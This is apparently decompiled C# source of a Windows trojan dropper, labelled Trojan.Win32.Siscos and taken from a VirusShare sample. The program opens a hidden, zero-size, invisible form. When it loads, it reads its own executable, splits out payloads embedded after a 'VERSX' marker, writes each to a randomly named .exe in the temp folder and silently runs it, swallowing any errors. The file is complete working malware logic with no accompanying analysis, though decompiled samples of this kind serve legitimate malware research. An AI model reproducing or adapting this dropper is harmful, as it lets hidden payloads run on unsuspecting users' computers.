// Decompiled with JetBrains decompiler
// Type: XYZ.Form1
// Assembly: XYZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9106CA7B-948E-416E-97B8-A9032E270DD9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Siscos.bqe-570d138fedbeb705acc17192b0cd3c2ab80e7ab81b57d7c102afd9e7b450b9d5.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace XYZ
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    private const string XYZ = "VERSX";

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.ControlBox = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    private static string GetRandom()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append(Form1.RandomString(4, true));
      stringBuilder.Append(Form1.RandomNumber(1000, 9999));
      stringBuilder.Append(Form1.RandomString(2, false));
      return stringBuilder.ToString();
    }

    private static int RandomNumber(int min, int max) => new Random().Next(min, max);

    private static string RandomString(int size, bool lowerCase)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      int num1 = checked (size - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        char ch = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
        stringBuilder.Append(ch);
        checked { ++num2; }
      }
      return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        int index = 1;
        string str = Form1.GetRandom().ToString();
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        string Expression = Microsoft.VisualBasic.Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref Expression);
        FileSystem.FileClose(1);
        string[] source = Microsoft.VisualBasic.Strings.Split(Expression, "VERSX");
        Conversions.ToString(((IEnumerable<string>) source).Count<string>());
        int num1 = ((IEnumerable<string>) source).Count<string>();
        int num2 = 0;
        while (num2 <= num1)
        {
          FileSystem.FileOpen(3, Path.GetTempPath() + "\\" + str + Conversions.ToString(index) + ".exe", OpenMode.Binary, OpenAccess.ReadWrite);
          FileSystem.FilePut(3, source[index], -1L, false);
          FileSystem.FileClose(3);
          Process.Start(Path.GetTempPath() + "\\" + str + Conversions.ToString(index) + ".exe");
          checked { ++index; }
          checked { ++num2; }
        }
        this.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Close();
        ProjectData.ClearProjectError();
      }
    }
  }
}
